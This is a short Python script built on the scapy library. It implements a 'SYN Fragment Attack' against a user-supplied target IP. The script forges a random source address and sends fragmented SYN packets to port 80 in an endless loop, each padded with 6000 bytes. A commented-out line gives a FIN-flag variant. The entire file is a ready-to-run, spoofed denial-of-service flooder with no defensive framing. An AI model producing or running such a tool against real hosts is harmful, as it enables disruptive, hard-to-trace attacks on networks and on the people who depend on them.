import scapy.all as scapy
import time
import os
def Syn_fragment():

	clear = os.system('clear')

	print("**************************************")
	print("          SYN FragmentAttack")
	print("**************************************")
	print("Please input your target's IP")
	dst_ip = input("[SYN Fragment]#")
	src_ip = scapy.RandIP()

#zidong sheng cheng yuan duankou he mudi duankou
	src_port = scapy.RandShort()
	dst_port = scapy.RandShort()
	packet_number = 0

	try:
		while True:
			packet = scapy.IP(src=src_ip ,dst=dst_ip,flags=[0x2000],frag=1)/scapy.TCP(dport=80,flags="S")/("X"*6000)
			#packet = scapy.IP(dst=dst_ip,flags=[0x2000],frag=1)/scapy.TCP(dport=80,flags="F")/("X"*6000)
			scapy.send(packet,verbose=False)
			packet_number +=1
			print("[+]Sent packet is " +str(packet_number))
	except KeyboardInterrupt:
		print("[-]Ctrl + C detected ....")

	
	
Syn_fragment()
	

	

